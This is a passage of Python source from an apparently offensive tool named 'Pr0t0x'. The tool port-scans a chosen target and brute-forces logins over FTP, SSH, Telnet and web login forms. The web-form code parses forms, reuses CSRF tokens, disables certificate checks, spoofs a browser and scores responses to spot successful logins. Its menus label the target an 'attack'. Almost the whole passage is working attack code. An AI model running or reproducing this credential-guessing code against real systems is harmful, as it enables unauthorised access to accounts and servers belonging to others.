║  {Style.BRIGHT}{Fore.WHITE}Total: {Colors.SUCCESS}{len(scan_results):<3}{Fore.BLUE} │ {Style.BRIGHT}{Fore.WHITE}Open: {Colors.SUCCESS}{open_count:<3}{Fore.BLUE} │ {Style.BRIGHT}{Fore.WHITE}Closed: {Colors.ERROR}{closed_count:<3}{Fore.BLUE} │ {Style.BRIGHT}{Fore.WHITE}Success: {Colors.SUCCESS}{success_rate:>6.1f}%{Fore.BLUE}      ║
╚═════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}"""
        # Add spacing between info box and results table if results are present
        # Add spacing between banner, info box and results table
        separator = "\n" if scan_results and len(scan_results) > 0 else ""
        return f"{banner}{info_box}{separator}{results_table}"
class Pr0t0x:
    def __init__(self):
        self.target = None
        self.selected_protocols = []
        self.attack_running = False
        self.attempts = 0
        self.successful = 0
        self.threads = 50
        self.found_credentials = []
        self.scan_results = {}

        self.banner = Banner()
        self.wordlist_manager = WordlistManager()

        self.protocols = {
            1: "FTP",
            2: "TELNET",
            3: "HTTP",
            4: "HTTPS",
            5: "SMTP",
            6: "MySQL",
            7: "PostgreSQL",
            8: "SMB",
            9: "SSH",
            10: "RDP"
        }
        
        # Port to protocol mapping
        self.port_protocol_map = {
            21: "FTP",
            22: "SSH",
            23: "TELNET",
            25: "SMTP",
            80: "HTTP",
            443: "HTTPS",
            445: "SMB",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL"
        }

    def get_protocol_availability(self, port):
        """Determine what protocols are available for a given port"""
        if port in self.port_protocol_map:
            return self.port_protocol_map[port]
        return "Unknown"

    def _calculate_content_similarity(self, content1, content2):
        """Calculate similarity between two content strings
        
        Args:
            content1 (str): First content string
            content2 (str): Second content string
            
        Returns:
            float: Similarity ratio between 0.0 (completely different) and 1.0 (identical)
        """
        try:
            # Simple similarity calculation based on common words and structure
            if not content1 or not content2:
                return 0.0
            
            # Normalize content for comparison
            content1_norm = content1.lower().strip()
            content2_norm = content2.lower().strip()
            
            # If content is identical, return 1.0
            if content1_norm == content2_norm:
                return 1.0
            
            # Calculate character-level similarity using simple ratio
            shorter = min(len(content1_norm), len(content2_norm))
            longer = max(len(content1_norm), len(content2_norm))
            
            if longer == 0:
                return 1.0 if shorter == 0 else 0.0
            
            # Count common characters
            common_chars = 0
            for i in range(min(shorter, longer)):
                if i < len(content1_norm) and i < len(content2_norm):
                    if content1_norm[i] == content2_norm[i]:
                        common_chars += 1
            
            # Basic similarity calculation
            char_similarity = common_chars / longer
            
            # Word-based similarity
            words1 = set(content1_norm.split())
            words2 = set(content2_norm.split())
            
            if not words1 and not words2:
                word_similarity = 1.0
            elif not words1 or not words2:
                word_similarity = 0.0
            else:
                common_words = len(words1.intersection(words2))
                total_words = len(words1.union(words2))
                word_similarity = common_words / total_words if total_words > 0 else 0.0
            
            # Length similarity
            length_ratio = shorter / longer if longer > 0 else 1.0
            
            # Combined similarity score
            similarity = (char_similarity * 0.4 + word_similarity * 0.4 + length_ratio * 0.2)
            
            return min(1.0, max(0.0, similarity))
            
        except Exception:
            # If similarity calculation fails, assume they're different
            return 0.0

    def try_form_based_authentication(self, url, username, password, timeout=10):
        """Enhanced form-based authentication with sophisticated success/failure detection,
        CSRF token handling, and improved form parsing
        
        Args:
            url (str): URL to test for form-based authentication
            username (str): Username to try
            password (str): Password to try
            timeout (int): Request timeout in seconds
            
        Returns:
            bool: True if authentication appears successful, False otherwise
        """
        try:
            import urllib.request
            import urllib.error
            import urllib.parse
            import ssl
            import re
            from http.cookiejar import CookieJar
            
            # Set up cookie jar for session management
            cookie_jar = CookieJar()
            cookie_processor = urllib.request.HTTPCookieProcessor(cookie_jar)
            
            # SSL context setup for HTTPS
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            https_handler = urllib.request.HTTPSHandler(context=ssl_context)
            opener = urllib.request.build_opener(https_handler, cookie_processor)
            
            # Enhanced headers to mimic real browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            
            # Try multiple common login paths
            login_paths = [
                url,
                url.rstrip('/') + '/login',
                url.rstrip('/') + '/admin',
                url.rstrip('/') + '/signin',
                url.rstrip('/') + '/auth',
                url.rstrip('/') + '/user/login',
                url.rstrip('/') + '/admin/login'
            ]
            
            baseline_content = None
            baseline_url = None
            
            for test_url in login_paths:
                try:
                    # First, fetch the login page
                    req = urllib.request.Request(test_url)
                    for header, value in headers.items():
                        req.add_header(header, value)
                        
                    response = opener.open(req, timeout=timeout)
                    page_content = response.read().decode('utf-8', errors='ignore')
                    baseline_content = page_content
                    baseline_url = response.geturl()
                    
                    # Parse the HTML to find login forms
                    parser = LoginFormParser()
                    parser.feed(page_content)
                    login_forms = parser.get_login_forms()
                    csrf_tokens = parser.get_csrf_tokens()
                    
                    if not login_forms:
                        continue  # Try next URL
                    
                    # Try each login form found (starting with highest confidence)
                    for form in login_forms:
                        try:
                            success = self._attempt_form_login(
                                form, test_url, username, password, opener, headers,
                                csrf_tokens, baseline_content, baseline_url, timeout
                            )
                            if success:
                                return True
                                
                        except Exception:
                            continue  # Try next form
                    
                except Exception:
                    continue  # Try next URL
            
            return False
            
        except Exception:
            return False
    
    def _attempt_form_login(self, form, page_url, username, password, opener, headers, csrf_tokens, baseline_content, baseline_url, timeout):
        """Attempt to login using a specific form with enhanced features"""
        try:
            import urllib.parse
            from urllib.parse import urljoin
            
            # Determine form action URL
            form_action = form['action']
            if not form_action:
                form_action = page_url
            elif not form_action.startswith('http'):
                form_action = urljoin(page_url, form_action)
            
            # Prepare form data with enhanced field detection
            form_data = {}
            username_field = None
            password_field = None
            
            # Enhanced username/password field detection
            username_field, password_field = self._identify_credential_fields(form)
            
            if not username_field or not password_field:
                return False
                
            # Build form data
            for field_name, field_info in form['inputs'].items():
                field_type = field_info['type']
                field_value = field_info['value']
                
                if field_name == username_field:
                    form_data[field_name] = username
                elif field_name == password_field:
                    form_data[field_name] = password
                elif field_type == 'hidden':
                    # Include all hidden fields
                    form_data[field_name] = field_value
                elif field_type == 'submit':
                    # Include submit button if it has a value
                    if field_value:
                        form_data[field_name] = field_value
                elif field_type in ['checkbox', 'radio']:
                    # Handle checkboxes and radio buttons
                    if 'checked' in field_info or field_info.get('checked', False):
                        form_data[field_name] = field_value or 'on'
            
            # Add CSRF tokens
            for token_name, token_value in form.get('csrf_tokens', set()):
                form_data[token_name] = token_value
                
            # Add any global CSRF tokens found on the page
            for token_name, token_value in csrf_tokens:
                if token_name not in form_data:
                    form_data[token_name] = token_value
            
            # Handle select fields
            for select_name, select_info in form.get('selects', {}).items():
                # Use first option or selected option
                for option in select_info.get('options', []):
                    if option.get('selected', False):
                        form_data[select_name] = option['value']
                        break
                else:
                    # No selected option, use first one
                    if select_info.get('options'):
                        form_data[select_name] = select_info['options'][0]['value']
            
            # Handle different form encodings
            enctype = form.get('enctype', 'application/x-www-form-urlencoded')
            
            if enctype == 'multipart/form-data':
                # Handle multipart forms (less common for login)
                import email.mime.multipart
                import email.mime.text
                import uuid
                
                boundary = uuid.uuid4().hex
                body_parts = []
                
                for name, value in form_data.items():
                    part = f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'
                    body_parts.append(part)
                    
                body = ''.join(body_parts) + f'--{boundary}--\r\n'
                encoded_data = body.encode('utf-8')
                content_type = f'multipart/form-data; boundary={boundary}'
            else:
                # Standard form encoding
                encoded_data = urllib.parse.urlencode(form_data).encode('utf-8')
                content_type = 'application/x-www-form-urlencoded'
            
            # Submit the form
            if form['method'].lower() == 'get':
                # GET method - append data to URL
                form_url = f"{form_action}?{urllib.parse.urlencode(form_data)}"
                req = urllib.request.Request(form_url)
            else:
                # POST method - send data in body
                req = urllib.request.Request(form_action, data=encoded_data)
                req.add_header('Content-Type', content_type)
            
            # Add headers
            for header, value in headers.items():
                req.add_header(header, value)
                
            req.add_header('Referer', page_url)
            
            # Submit form and analyze response
            try:
                auth_response = opener.open(req, timeout=timeout)
                response_content = auth_response.read().decode('utf-8', errors='ignore')
                response_url = auth_response.geturl()
                response_code = auth_response.getcode()
                response_headers = dict(auth_response.headers)
                
                # Enhanced success/failure analysis
                return self._analyze_authentication_response(
                    response_content, response_url, response_code, response_headers,
                    baseline_content, baseline_url, form_action, username, password
                )
                
            except urllib.error.HTTPError as e:
                # Handle HTTP errors
                if e.code in [301, 302, 303, 307, 308]:  # Redirects
                    return self._analyze_redirect_response(e, form_action)
                elif e.code == 401:
                    return False  # Unauthorized
                elif e.code == 403:
                    # Could be success with different access level
                    return self._analyze_error_response(e)
                else:
                    return False
            
        except Exception:
            return False
    
    def _identify_credential_fields(self, form):
        """Enhanced identification of username and password fields"""
        username_field = None
        password_field = None
        
        # Password field is usually easier to identify
        for field_name, field_info in form['inputs'].items():
            if field_info['type'] == 'password':
                password_field = field_name
                break
        
        # Enhanced username field detection
        username_candidates = []
        
        for field_name, field_info in form['inputs'].items():
            if field_info['type'] in ['text', 'email']:
                score = 0
                field_name_lower = field_name.lower()
                field_id = field_info.get('id', '').lower()
                field_class = field_info.get('class', '').lower()
                field_placeholder = field_info.get('placeholder', '').lower()
                field_autocomplete = field_info.get('autocomplete', '').lower()
                
                # Score based on field name
                username_indicators = {
                    'username': 100, 'user': 90, 'login': 90, 'email': 95,
                    'account': 80, 'userid': 85, 'user_name': 95, 'user_id': 85,
                    'loginname': 90, 'uname': 85, 'signin': 80, 'usr': 75,
                    'mail': 90, 'user_email': 95, 'login_email': 95
                }
                
                for indicator, points in username_indicators.items():
                    if indicator in field_name_lower:
                        score += points
                        break
                
                # Score based on other attributes
                for attr in [field_id, field_class, field_placeholder, field_autocomplete]:
                    for indicator, points in username_indicators.items():
                        if indicator in attr:
                            score += points // 2
                            break
                
                # Email type gets bonus
                if field_info['type'] == 'email':
                    score += 50
                    
                # Required fields get bonus
                if field_info.get('required', False):
                    score += 10
                    
                username_candidates.append((field_name, score))
        
        # Choose highest scoring username field
        if username_candidates:
            username_candidates.sort(key=lambda x: x[1], reverse=True)
            username_field = username_candidates[0][0]
        
        return username_field, password_field
    
    def _analyze_authentication_response(self, response_content, response_url, response_code, 
                                       response_headers, baseline_content, baseline_url, 
                                       form_action, username, password):
        """Enhanced analysis of authentication response"""
        try:
            response_lower = response_content.lower()
            
            # Enhanced success indicators with categories
            success_indicators = {
                'navigation': ['dashboard', 'home', 'main', 'index', 'welcome', 'portal'],
                'user_actions': ['logout', 'sign out', 'profile', 'account', 'settings', 'preferences'],
                'admin_features': ['admin panel', 'control panel', 'management', 'administration'],
                'success_messages': ['success', 'logged in', 'welcome back', 'login successful'],
                'user_info': ['hello', 'hi', username.lower()],
                'content_areas': ['content', 'workspace', 'data', 'files', 'documents']
            }
            
            # Enhanced failure indicators with categories
            failure_indicators = {
                'auth_errors': ['invalid', 'incorrect', 'wrong', 'failed', 'denied', 'unauthorized'],
                'credential_errors': ['wrong password', 'wrong username', 'invalid credentials', 
                                    'authentication failed', 'login failed', 'access denied'],
                'form_errors': ['error', 'try again', 'please check', 'verification failed'],
                'account_issues': ['locked', 'disabled', 'suspended', 'blocked', 'expired']
            }
            
            # Calculate success score
            success_score = 0
            failure_score = 0
            
            for category, indicators in success_indicators.items():
                for indicator in indicators:
                    if indicator in response_lower:
                        weight = 3 if category in ['user_actions', 'success_messages'] else 2
                        success_score += weight
            
            for category, indicators in failure_indicators.items():
                for indicator in indicators:
                    if indicator in response_lower:
                        weight = 4 if category in ['auth_errors', 'credential_errors'] else 3
                        failure_score += weight
            
            # URL-based analysis
            url_success_indicators = ['dashboard', 'home', 'main', 'admin', 'user', 'welcome']
            url_failure_indicators = ['login', 'signin', 'auth', 'error']
            
            if any(indicator in response_url.lower() for indicator in url_success_indicators):
                success_score += 5
            if any(indicator in response_url.lower() for indicator in url_failure_indicators):
                failure_score += 3
            
            # Redirect analysis
            if response_url != form_action and response_code == 200:
                # Redirected to different page
                if not any(indicator in response_url.lower() for indicator in ['login', 'signin', 'auth', 'error']):
                    success_score += 4
            
            # Content similarity analysis
            if baseline_content:
                similarity = self._calculate_content_similarity(baseline_content, response_content)
                if similarity < 0.7:  # Significantly different content
                    success_score += 2
                elif similarity > 0.95:  # Almost identical (likely still on login page)
                    failure_score += 3
            
            # Header analysis
            if 'set-cookie' in response_headers:
                # Check for session cookies
                cookies = response_headers['set-cookie'].lower()
                if any(term in cookies for term in ['session', 'auth', 'token', 'user']):
                    success_score += 2
            
            # Form presence analysis
            if 'password' in response_lower and 'login' in response_lower:
                # Still shows login form
                failure_score += 2
            
            # Final decision
            if failure_score > success_score and failure_score > 3:
                return False
            elif success_score > failure_score and success_score > 4:
                return True
            elif success_score > 0 and failure_score == 0:
                return True
            else:
                # Ambiguous case - lean towards failure for security
                return False
                
        except Exception:
            return False
    
    def _analyze_redirect_response(self, error, form_action):
        """Analyze redirect responses for authentication success"""
        try:
            location = error.headers.get('Location', '')
            if location:
                location_lower = location.lower()
                # Redirect away from login page often indicates success
                if not any(term in location_lower for term in ['login', 'signin', 'auth', 'error']):
                    return True
                elif any(term in location_lower for term in ['dashboard', 'home', 'main', 'admin']):
                    return True
            return False
        except Exception:
            return False
    
    def _analyze_error_response(self, error):
        """Analyze error responses that might indicate partial success"""
        try:
            if hasattr(error, 'read'):
                error_content = error.read().decode('utf-8', errors='ignore').lower()
                # 403 with specific content might indicate successful auth but insufficient permissions
                if 'permission' in error_content or 'authorized' in error_content:
                    return True
            return False
        except Exception:
            return False
    
    def format_selected_protocols(self):
        """Generate a styled string of the currently selected protocols
        
        Returns:
            str: A formatted string displaying selected protocols with colors and styling
        """
        if not self.selected_protocols:
            return f"{Colors.WARNING}No protocols selected"
        
        # Create the header using consistent box style matching the banner
        header_text = f"SELECTED PROTOCOLS ({len(self.selected_protocols)})"
        header = f"""{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════╗
║ {Style.BRIGHT}{Colors.TITLE}{header_text.center(64)}{Colors.PRIMARY} ║
╠══════════════════════════════════════════════════════════════════╣"""
        
        # Format each protocol with consistent tree-style formatting
        formatted_protocols = []
        for i, protocol in enumerate(self.selected_protocols, 1):
            # Check if protocol has an open port in scan results
            is_available = False
            port_info = ""
            response_info = ""
            
            if self.scan_results:
                for port, info in self.scan_results.items():
                    if info.get('protocol') == protocol and info.get('status', False):
                        is_available = True
                        port_info = f"Port {port}"
                        if info.get('response_time'):
                            response_info = f" ({info['response_time']:.3f}s)"
                        break
            
            # Use consistent tree-style formatting with proper spacing
            if i == len(self.selected_protocols):  # Last item
                tree_char = "└─"
            else:
                tree_char = "├─"
            
            # Style based on availability with consistent indicators
            if is_available:
                status_icon = f"{Colors.SUCCESS}✓"
                protocol_name = f"{Style.BRIGHT}{Colors.SUCCESS}{protocol}"
                port_display = f" {Colors.PRIMARY}({port_info}){Colors.SUCCESS}{response_info}"
            else:
                status_icon = f"{Colors.SUBTLE}○"
                protocol_name = f"{Colors.SUBTLE}{protocol}"
                port_display = f" {Colors.SUBTLE}(No scan data)"
            
            # Format with consistent column alignment
            formatted_protocols.append(
                f"║ {Colors.PRIMARY}{tree_char} {status_icon} {protocol_name:<15}{port_display:<25} ║"
            )
        
        # Close the box with consistent style
        protocols_list = "\n".join(formatted_protocols)
        footer = f"{Colors.PRIMARY}╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}"
        
        styled_output = f"{header}\n{protocols_list}\n{footer}"
        
        return styled_output

    def check_internet(self):
        """Check internet connectivity"""
        try:
            requests.get("http://www.google.com", timeout=3)
            return "ONLINE"
        except:
            return "OFFLINE"
    def show_banner(self):
        """Display the program banner with scan results if available"""
        Effects.clear_screen()
        status = self.check_internet()
        print(self.banner.render(self.target or "No Target", status, self.scan_results))

    def create_menu_box(self, title, options):
        """Create a formatted menu box"""
        menu = f"\n{Fore.BLUE}╔══════════════════════════════════╗\n"
        menu += f"║ {Style.BRIGHT}{Fore.CYAN}{title.center(30)}{Fore.BLUE} ║\n"
        menu += f"╠══════════════════════════════════╣\n"

        for key, value in options.items():
            menu += f"║ {Fore.BLUE}[{Style.BRIGHT}{Fore.WHITE}{key}{Fore.BLUE}] {Style.BRIGHT}{Fore.WHITE}{value}{' ' * (27 - len(value))} ║\n"

        menu += f"╚══════════════════════════════════╝{Style.RESET_ALL}"
        return menu

    def set_target(self):
        """Set the target for the attack"""
        self.show_banner()
        print(f"\n{Colors.INFO}Enter target IP or hostname:")
        target = input(f"{Colors.PRIMARY}┌──({Colors.INFO}PR0T0X{Colors.PRIMARY})-[{Colors.INFO}target{Colors.PRIMARY}]\n└─$ {Colors.INFO}")

        if target.strip():
            self.target = target
            Effects.loading_spinner("Scanning target", 2)
            self.scan_ports()
        else:
            print(f"{Colors.ERROR}Invalid target provided")
        time.sleep(2)
    def scan_ports(self):
        """Enhanced scan of target ports with status indicators"""
        common_ports = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 5432]
        self.scan_results = {}
        scan_start_time = datetime.now()
        
        print(f"\n{Colors.INFO}Initiating port scan on {Colors.PRIMARY}{self.target}{Colors.INFO}...")
        print(f"{Colors.SUBTLE}Scan started at: {scan_start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        with tqdm(total=len(common_ports), desc=f"{Colors.PRIMARY}Scanning Ports",
                 bar_format="{l_bar}{bar:30}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as pbar:
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    start_time = time.time()
                    result = sock.connect_ex((self.target, port))
                    response_time = time.time() - start_time
                    
                    if result == 0:
                        try:
                            service = socket.getservbyport(port)
                        except:
                            service = "unknown"
                        
                        # Store in dictionary with enhanced information
                        self.scan_results[port] = {
                            'service': service,
                            'protocol': self.get_protocol_availability(port),
                            'status': True,
                            'response_time': round(response_time, 3)
                        }
                        print(f"{Colors.SUCCESS}[✓] Port {port}/{service} is open (Response: {self.scan_results[port]['response_time']}s)")
                    else:
                        # Store closed port information
                        self.scan_results[port] = {
                            'service': 'closed',
                            'protocol': self.get_protocol_availability(port),
                            'status': False,
                            'response_time': 0
                        }
                        print(f"{Colors.ERROR}[✗] Port {port} is closed")
                    
                    sock.close()
                except socket.gaierror:
                    print(f"{Colors.ERROR}[!] Hostname resolution failed for {self.target}")
                    self.scan_results[port] = {
                        'service': 'error',
                        'protocol': 'unknown',
                        'status': False,
                        'response_time': 0,
                        'error': 'Hostname resolution failed'
                    }
                except Exception as e:
                    print(f"{Colors.ERROR}[!] Error scanning port {port}: {str(e)}")
                    self.scan_results[port] = {
                        'service': 'error',
                        'protocol': 'unknown',
                        'status': False,
                        'response_time': 0,
                        'error': str(e)
                    }
                pbar.update(1)
                time.sleep(0.05)  # Small delay to prevent overwhelming the target
        
        scan_duration = (datetime.now() - scan_start_time).total_seconds()
        open_ports = sum(1 for info in self.scan_results.values() if info.get('status', False))
        
        print(f"\n{Colors.SUCCESS}Scan completed in {scan_duration:.2f} seconds")
        print(f"{Colors.SUCCESS}Found {open_ports} open ports out of {len(common_ports)} scanned")
        
        if open_ports > 0:
            self.display_scan_results()
        else:
            print(f"\n{Colors.WARNING}No open ports found on target {self.target}")
    def display_scan_results(self):
        """Enhanced display of scan results with detailed statistics"""
        if not self.scan_results:
            return
            
        # Show the updated banner with scan results
        self.show_banner()
        
        # Calculate statistics
        open_ports = sum(1 for info in self.scan_results.values() if info.get('status', False))
        response_times = [info.get('response_time', 0) for info in self.scan_results.values() if info.get('status', False)]
        fastest_response = min(response_times) if response_times else 0
        slowest_response = max(response_times) if response_times else 0
        avg_response = sum(response_times) / len(response_times) if response_times else 0
        
        # Display additional statistics
        print(f"\n{Colors.INFO}Scan Statistics:")
        print(f"{Colors.PRIMARY}├─ {Colors.INFO}Total Ports Scanned: {Colors.PRIMARY}{len(self.scan_results)}")
        print(f"{Colors.PRIMARY}├─ {Colors.INFO}Open Ports: {Colors.SUCCESS}{open_ports}")
        print(f"{Colors.PRIMARY}├─ {Colors.INFO}Closed Ports: {Colors.ERROR}{len(self.scan_results) - open_ports}")
        print(f"{Colors.PRIMARY}├─ {Colors.INFO}Fastest Response: {Colors.SUCCESS}{fastest_response:.3f}s")
        print(f"{Colors.PRIMARY}├─ {Colors.INFO}Slowest Response: {Colors.WARNING}{slowest_response:.3f}s")
        print(f"{Colors.PRIMARY}└─ {Colors.INFO}Average Response: {Colors.PRIMARY}{avg_response:.3f}s")
        
        # Wait for user acknowledgment
        print(f"\n{Colors.INFO}Press Enter to continue...")
        input()
        
    def select_protocols(self):
        """Select protocols for the attack"""
        self.show_banner()
        
        # Filter protocols based on scan results if available
        available_protocols = {}
        if self.scan_results:
            print(f"\n{Colors.INFO}Suggesting protocols based on scan results:")
            
            for port, info in self.scan_results.items():
                if info.get('status', False):  # Only suggest protocols for open ports
                    protocol = info.get('protocol', '')
                    for k, v in self.protocols.items():
                        if v == protocol:
                            port_str = str(port)
                            service_str = info['service']
                            # Update protocol display formatting for open ports
                            available_protocols[str(k)] = (
                                f"{Colors.SUCCESS}▶ {v} "  # Protocol name in green
                                f"(Port {port_str}, {service_str}){Colors.PRIMARY}"  # Port and service info in green
                            )
                            break
            # Add protocols that weren't found in scan
            for k, v in self.protocols.items():
                if str(k) not in available_protocols:
                    available_protocols[str(k)] = f"{Colors.SUBTLE}{v}"  # Use subtle color for unavailable protocols
        else:
            available_protocols = {str(k): v for k, v in self.protocols.items()}
            
        print(self.create_menu_box("PROTOCOL SELECTION", available_protocols))
        
        print(f"\n{Colors.INFO}Enter protocol numbers (comma-separated) or 'all':")
        choice = input(f"{Colors.PRIMARY}┌──({Colors.INFO}PR0T0X{Colors.PRIMARY})-[{Colors.INFO}protocols{Colors.PRIMARY}]\n└─$ {Colors.INFO}")

        self.selected_protocols = []
        if choice.lower() == 'all':
            self.selected_protocols = list(self.protocols.values())
        else:
            try:
                for num in choice.split(','):
                    num = int(num.strip())
                    if num in self.protocols:
                        self.selected_protocols.append(self.protocols[num])
                        print(f"{Colors.SUCCESS}[✓] Added: {self.protocols[num]}")
                    else:
                        print(f"{Colors.ERROR}[!] Invalid protocol: {num}")
            except ValueError:
                print(f"{Colors.ERROR}Invalid input")

        if self.selected_protocols:
            print(f"\n{Colors.SUCCESS}Selected protocols:")
            for protocol in self.selected_protocols:
                print(f"{Colors.SUCCESS}▶ {protocol}")
        else:
            print(f"\n{Colors.ERROR}No protocols selected")
        time.sleep(2)

    def try_credentials(self, protocol, username, password):
        """Test credentials against target"""
        if not self.attack_running:
            return False
            
        # Check for interrupt signal early
        if interrupt_received:
            return False

        try:
            self.attempts += 1
            progress = f"\r{Colors.PRIMARY}[{self.attempts}] Trying {protocol}: {username}:{password}"
            print(f"{progress:<80}", end='', flush=True)

            # Default timeout for all connections (in seconds)
            timeout = 5
            success = False
            
            # FTP protocol implementation
            if protocol == "FTP":
                try:
                    # First check if FTP service is available
                    with ftplib.FTP(timeout=timeout) as ftp:
                        # Try to connect first
                        ftp.connect(self.target, 21)
                        
                        # Get welcome message to verify FTP service
                        welcome = ftp.getwelcome()
                        
                        # Try anonymous login first to check if auth is required
                        try:
                            ftp.login('anonymous', 'anonymous@test.com')
                            # If anonymous login succeeds, try with actual credentials
                            ftp.quit()
                            
                            # Reconnect for actual credential test
                            with ftplib.FTP(timeout=timeout) as ftp2:
                                ftp2.connect(self.target, 21)
                                ftp2.login(user=username, passwd=password)
                                success = True
                                
                        except ftplib.error_perm as e:
                            # Anonymous login failed - good, try with real credentials
                            if "530" in str(e) or "login" in str(e).lower():
                                # FTP requires authentication
                                try:
                                    ftp.login(user=username, passwd=password)
                                    success = True
                                except ftplib.error_perm as login_e:
                                    if "530" in str(login_e) or "incorrect" in str(login_e).lower():
                                        success = False
                                    else:
                                        # Other permission error
                                        success = False
                            else:
                                # Other error with anonymous login
                                try:
                                    ftp.login(user=username, passwd=password)
                                    success = True
                                except ftplib.error_perm:
                                    success = False
                                    
                except ftplib.error_perm as e:
                    # Direct login attempt failed
                    error_msg = str(e).lower()
                    if "530" in str(e) or "login" in error_msg or "incorrect" in error_msg or "failed" in error_msg:
                        success = False
                    else:
                        # Other permission error, might be access issue
                        success = False
                except (ConnectionRefusedError, ftplib.error_temp, socket.timeout, OSError, TimeoutError):
                    # Connection issues - don't count as credential failure
                    return False
                except Exception as e:
                    # Unexpected FTP error
                    if "530" in str(e) or "login" in str(e).lower():
                        success = False
                    else:
                        return False
            
            # SSH protocol implementation
            elif protocol == "SSH":
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    # Set up connection parameters with better error handling
                    connect_params = {
                        'hostname': self.target,
                        'username': username,
                        'password': password,
                        'timeout': timeout,
                        'allow_agent': False,
                        'look_for_keys': False,
                        'banner_timeout': timeout,
                        'auth_timeout': timeout
                    }
                    
                    # Try different SSH ports if 22 fails
                    ssh_ports = [22, 2222, 2200]  # Common SSH ports
                    connection_success = False
                    
                    for port in ssh_ports:
                        try:
                            connect_params['port'] = port
                            ssh.connect(**connect_params)
                            connection_success = True
                            break
                        except (paramiko.AuthenticationException, paramiko.BadAuthenticationType):
                            # Authentication failed - wrong credentials, but port is correct
                            connection_success = True
                            success = False
                            break
                        except (ConnectionRefusedError, socket.error, paramiko.SSHException) as e:
                            # Try next port
                            if "refused" in str(e).lower() or "unreachable" in str(e).lower():
                                continue
                            else:
                                # Other SSH error, not connection related
                                break
                        except Exception as e:
                            # Unknown error, try next port
                            continue
                    
                    if not connection_success:
                        # Could not connect on any port
                        return False
                    
                    # If we connected successfully (no authentication exception)
                    if connection_success and 'success' not in locals():
                        success = True
                        
                    ssh.close()
                    
                except paramiko.AuthenticationException:
                    # Authentication failed - wrong credentials
                    success = False
                except paramiko.BadAuthenticationType as e:
                    # Server doesn't support password auth or credentials are wrong
                    if "password" in str(e).lower():
                        success = False
                    else:
                        # Server doesn't support password authentication at all
                        return False
                except paramiko.SSHException as e:
                    # SSH-specific errors
                    error_msg = str(e).lower()
                    if any(term in error_msg for term in ['authentication', 'login', 'password', 'credential']):
                        success = False
                    else:
                        # Connection or protocol issue
                        return False
                except (ConnectionRefusedError, socket.error, socket.timeout, TimeoutError) as e:
                    # Connection issues - don't count as credential failure
                    return False
                except Exception as e:
                    # Unexpected error
                    error_msg = str(e).lower()
                    if any(term in error_msg for term in ['authentication', 'login', 'password']):
                        success = False
                    else:
                        return False
            
            # Telnet protocol implementation (socket-based replacement for deprecated telnetlib)
            elif protocol == "TELNET":
                try:
                    # Try common telnet ports
                    telnet_ports = [23, 2323, 992]  # Standard telnet, alternative, and TLS telnet
                    connection_success = False
                    
                    for port in telnet_ports:
                        try:
                            # Create socket connection to telnet port
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(timeout)
                            sock.connect((self.target, port))
                            connection_success = True
                            break
                        except (ConnectionRefusedError, socket.error):
                            if port == telnet_ports[-1]:  # Last port attempt
                                return False
                            continue
                    
                    if not connection_success:
                        return False
                    
                    # Read initial banner/prompt with better handling
                    try:
                        initial_data = sock.recv(2048)  # Larger buffer for banner
                        # Look for initial authentication requirement
                        if b'Password:' in initial_data or b'password:' in initial_data:
                            # Some systems ask for password immediately
                            sock.send(password.encode('ascii') + b'\r\n')
                        else:
                            # Standard flow - wait for login prompt
                            pass
                    except socket.timeout:
                        # No initial banner, continue
                        pass
                    
                    # Enhanced login prompt detection
                    login_prompts = [
                        b'login:', b'Login:', b'USERNAME:', b'Username:', b'User:', b'user:',
                        b'Name:', b'name:', b'Account:', b'account:', b'User Name:'
                    ]
                    prompt_found = False
                    accumulated_data = b''
                    
                    # Try to find login prompt with better timing
                    for attempt in range(15):  # More attempts with shorter timeouts
                        try:
                            sock.settimeout(0.5)  # Shorter timeout per attempt
                            data = sock.recv(1024)
                            accumulated_data += data
                            
                            if any(prompt in accumulated_data.lower() for prompt in [p.lower() for p in login_prompts]):
                                prompt_found = True
                                break
                                
                            # Check if we already got a shell (no auth required)
                            shell_indicators = [b'$', b'#', b'>', b'%', b'~']
                            if any(indicator in data for indicator in shell_indicators):
                                # Already authenticated or no auth required
                                success = True
                                sock.close()
                                return success
                                
                        except socket.timeout:
                            # Send a newline to potentially trigger prompt
                            if attempt % 3 == 0:
                                try:
                                    sock.send(b'\r\n')
                                except:
                                    pass
                            continue
                        except socket.error:
                            break
                    
                    # Send username
                    try:
                        if not prompt_found:
                            # Send newline first to get prompt
                            sock.send(b'\r\n')
                            time.sleep(0.5)
                        
                        sock.settimeout(timeout)  # Reset to original timeout
                        sock.send(username.encode('ascii', errors='ignore') + b'\r\n')
                    except (socket.error, UnicodeEncodeError):
                        sock.close()
                        return False
                    
                    # Enhanced password prompt detection
                    password_prompts = [
                        b'password:', b'Password:', b'PASS:', b'Pass:', b'passwd:',
                        b'Password for', b'Enter password', b'pwd:', b'secret:'
                    ]
                    password_prompt_found = False
                    accumulated_data = b''
                    
                    for attempt in range(15):  # More attempts for password prompt
                        try:
                            sock.settimeout(0.5)
                            data = sock.recv(1024)
                            accumulated_data += data
                            
                            if any(prompt in accumulated_data.lower() for prompt in [p.lower() for p in password_prompts]):
                                password_prompt_found = True
                                break
                                
                            # Check for immediate failure (bad username)
                            failure_indicators = [
                                b'invalid', b'unknown', b'not found', b'incorrect',
